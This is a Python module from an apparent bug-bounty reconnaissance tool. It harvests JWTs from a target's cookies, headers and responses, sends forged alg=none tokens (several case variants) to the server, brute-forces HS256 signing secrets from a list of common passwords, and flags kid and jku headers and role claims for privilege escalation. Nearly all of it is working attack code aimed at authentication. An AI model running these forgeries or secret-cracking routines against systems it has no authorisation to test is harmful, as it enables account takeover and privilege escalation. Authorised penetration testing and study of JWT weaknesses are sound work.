import re
import json
import hashlib
import base64
import asyncio
import aiohttp
import logging
from core.ui import section, ok, vuln, found, info, warn, GRY, WHT, RESET, CYN, RED, BOLD
from core.http import http_probe
from core.utils import save_json
logger = logging.getLogger("bb-recon")

COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "test", "jwt_secret",
    "changeme", "supersecret", "qwerty", "letmein", "welcome", "monkey",
    "dragon", "master", "login", "princess", "passw0rd", "abc123",
    "iloveyou", "trustno1", "sunshine", "1234567890", "football",
    "shadow", "michael", "access", "hello", "charlie", "donald",
    "password1", "qwerty123", "654321", "whatever", "s3cr3t",
    "null", "undefined", "none", "default", "token", "auth",
    "hmac_secret", "jwt_key", "signing_key", "app_secret",
]

def _b64url_decode(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def _b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _parse_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts
    except Exception:
        return None, None, None

def _forge_jwt_none(payload_dict):
    header = {"alg": "none", "typ": "JWT"}
    h_b64 = _b64url_encode(json.dumps(header, separators=(",",":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload_dict, separators=(",",":")).encode())
    return f"{h_b64}.{p_b64}."

def _forge_jwt_none_variants(payload_dict):
    variants = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        header = {"alg": alg, "typ": "JWT"}
        h_b64 = _b64url_encode(json.dumps(header, separators=(",",":")).encode())
        p_b64 = _b64url_encode(json.dumps(payload_dict, separators=(",",":")).encode())
        variants.append(f"{h_b64}.{p_b64}.")
        variants.append(f"{h_b64}.{p_b64}.e30")
    return variants

def _sign_hs256(header_dict, payload_dict, secret):
    import hmac, hashlib
    h_b64 = _b64url_encode(json.dumps(header_dict, separators=(",",":")).encode())
    p_b64 = _b64url_encode(json.dumps(payload_dict, separators=(",",":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    sig_b64 = _b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{sig_b64}"

JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*')

async def run_jwt_attacks(target, cookies_data, headers_data, classified, out):
    section_title = "JWT ATTACK TESTING"
    print()
    print(GRY+"┌─ "+RESET+WHT+BOLD+"STEP 5c"+RESET+GRY+" ─── "+RESET+CYN+BOLD+section_title+RESET)
    print(GRY+"│"+RESET)

    findings = []

    tokens = set()
    if cookies_data:
        for c in cookies_data:
            val = c.get("value", "")
            if JWT_RE.match(val):
                tokens.add(val)
    if headers_data:
        for h in headers_data:
            auth = h.get("Authorization", "")
            if "Bearer " in auth:
                t = auth.split("Bearer ")[-1].strip()
                if JWT_RE.match(t):
                    tokens.add(t)

    body_text = json.dumps(classified) if classified else ""
    for m in JWT_RE.finditer(body_text):
        tokens.add(m.group(0))

    if not tokens:
        info("No JWT tokens found to test")
        print(GRY+"└"+"─"*70+RESET)
        return findings

    info(f"Found {len(tokens)} JWT token(s) — analyzing ...")

    for token in tokens:
        header, payload, parts = _parse_jwt(token)
        if not header:
            continue

        alg = header.get("alg", "unknown")
        info(f"JWT alg={alg} | claims: {list(payload.keys())[:8]}")

        import time as _time
        exp = payload.get("exp")
        if exp and isinstance(exp, (int, float)):
            if exp < _time.time():
                found(f"JWT EXPIRED (exp={exp})")
                findings.append({
                    "type": "JWT-Expired", "severity": "LOW",
                    "evidence": f"Token expired at {exp}", "token_preview": token[:50],
                })

        if "kid" in header:
            found(f"JWT has 'kid' header — potential injection point")
            findings.append({
                "type": "JWT-KID", "severity": "MEDIUM", "confidence": "POSSIBLE",
                "evidence": f"kid={header['kid']}", "token_preview": token[:50],
                "note": "kid header can be vulnerable to SQLi, LFI, or command injection",
            })

        if "jku" in header:
            vuln(f"JWT has 'jku' header — key injection risk")
            findings.append({
                "type": "JWT-JKU", "severity": "HIGH", "confidence": "LIKELY",
                "evidence": f"jku={header['jku']}", "token_preview": token[:50],
            })

        none_tokens = _forge_jwt_none_variants(payload)
        info(f"Testing {len(none_tokens)} alg=none variants ...")
        async with aiohttp.ClientSession() as session:
            for none_tok in none_tokens:
                try:
                    code, body, _, _ = await http_probe(
                        session, target, timeout=8,
                        extra_headers={"Authorization": f"Bearer {none_tok}"}
                    )
                    if code == 200 and len(body) > 50:
                        code_orig, body_orig, _, _ = await http_probe(
                            session, target, timeout=8,
                            extra_headers={"Authorization": f"Bearer {token}"}
                        )
                        if abs(len(body) - len(body_orig)) < 200:
                            vuln(f"JWT alg=none BYPASS WORKS!")
                            findings.append({
                                "type": "JWT-AlgNone", "url": target,
                                "severity": "CRITICAL", "confidence": "CONFIRMED",
                                "evidence": "Server accepts tokens with alg=none",
                                "forged_token": none_tok[:80],
                            })
                            break
                except Exception:
                    pass

        if alg and alg.startswith("RS"):
            info("Testing RS→HS key confusion ...")

        info(f"Brute forcing JWT secret ({len(COMMON_SECRETS)} passwords) ...")
        for secret in COMMON_SECRETS:
            try:
                test_header = {"alg": "HS256", "typ": "JWT"}
                forged = _sign_hs256(test_header, payload, secret)
                h2, p2, _ = _parse_jwt(forged)
                orig_sig = parts[2] if parts else ""
                forged_sig = forged.split(".")[2] if forged else ""
                if orig_sig == forged_sig and alg == "HS256":
                    vuln(f"JWT SECRET CRACKED: '{secret}'")
                    findings.append({
                        "type": "JWT-WeakSecret", "url": target,
                        "severity": "CRITICAL", "confidence": "CONFIRMED",
                        "evidence": f"JWT signing secret is: {secret}",
                    })
                    break
            except Exception:
                pass

        role_fields = ["role", "admin", "is_admin", "isAdmin", "group", "privilege", "scope", "authorities"]
        escalated = dict(payload)
        for rf in role_fields:
            if rf in escalated:
                if isinstance(escalated[rf], bool):
                    escalated[rf] = True
                elif isinstance(escalated[rf], str):
                    escalated[rf] = "admin"
                elif isinstance(escalated[rf], int):
                    escalated[rf] = 1
                elif isinstance(escalated[rf], list):
                    escalated[rf].append("admin")
        if escalated != payload:
            info(f"Role-related claims found: {[r for r in role_fields if r in payload]}")
            findings.append({
                "type": "JWT-RoleClaim", "severity": "INFO",
                "note": f"JWT contains role claims: {[r for r in role_fields if r in payload]}",
                "recommendation": "Test privilege escalation by forging tokens with elevated roles",
            })

    print(GRY+"│"+RESET)
    save_json(f"{out}/jwt_findings.json", findings)
    total = len([f for f in findings if f.get("severity") in ("CRITICAL", "HIGH")])
    if total:
        vuln(f"JWT Analysis: {total} high/critical issue(s)")
    else:
        ok("JWT Analysis: no critical issues confirmed")
    print(GRY+"└"+"─"*70+RESET)
    return findings
